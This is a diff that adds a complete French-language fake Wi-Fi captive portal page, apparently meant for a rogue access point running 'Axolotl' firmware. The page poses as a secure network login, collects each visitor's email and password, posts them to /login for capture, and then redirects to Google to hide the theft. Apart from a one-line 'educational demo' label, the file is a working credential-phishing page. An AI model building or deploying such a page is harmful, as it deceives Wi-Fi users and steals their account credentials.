@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connexion Wi-Fi</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a1410;color:#eee;font-family:'Segoe UI',system-ui,sans-serif;
+     display:flex;justify-content:center;align-items:center;min-height:100vh}
+.box{background:#111e18;padding:40px;border-radius:16px;max-width:400px;width:90%;
+     box-shadow:0 20px 60px rgba(0,0,0,.8)}
+.logo{text-align:center;font-size:56px;margin-bottom:8px}
+h1{color:#ff8c00;font-size:28px;text-align:center;letter-spacing:2px;margin-bottom:4px}
+.sub{color:#9fd;text-align:center;font-size:14px;margin-bottom:24px}
+label{display:block;color:#9fd;font-size:13px;margin:14px 0 5px}
+input{width:100%;padding:12px 14px;background:#0a1410;border:2px solid #1a2e24;
+      border-radius:8px;color:#eee;font-size:15px}
+input:focus{outline:none;border-color:#ff8c00}
+button{width:100%;margin-top:20px;padding:12px;background:linear-gradient(135deg,#ff8c00,#e67600);
+       border:none;border-radius:8px;color:#0a1410;font-size:16px;font-weight:700;cursor:pointer}
+.foot{text-align:center;margin-top:16px;color:#456;font-size:12px}
+.ok{color:#44ff88;text-align:center;margin-top:10px;display:none}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="logo">📶</div>
+  <h1>Connexion Wi-Fi</h1>
+  <p class="sub">Authentifiez-vous pour accéder à Internet</p>
+  <!-- IMPORTANT : le firmware Axolotl capture ce POST sur /login.
+       Les champs DOIVENT s'appeler exactement `email` et `password`. -->
+  <form id="f" onsubmit="return send(event)">
+    <label>Email</label>
+    <input type="email" id="email" name="email" placeholder="exemple@email.com" required>
+    <label>Mot de passe</label>
+    <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
+    <button type="submit">Se connecter</button>
+    <div class="ok" id="ok">✅ Connexion établie…</div>
+  </form>
+  <div class="foot">🔒 Réseau sécurisé • démo pédagogique</div>
+</div>
+<script>
+function send(e){
+  e.preventDefault();
+  var b='email='+encodeURIComponent(email.value)+'&password='+encodeURIComponent(password.value);
+  fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b})
+    .then(function(){document.getElementById('ok').style.display='block';
+      setTimeout(function(){location.href='https://www.google.com'},2000);});
+  return false;
+}
+</script>
+</body>
+</html>
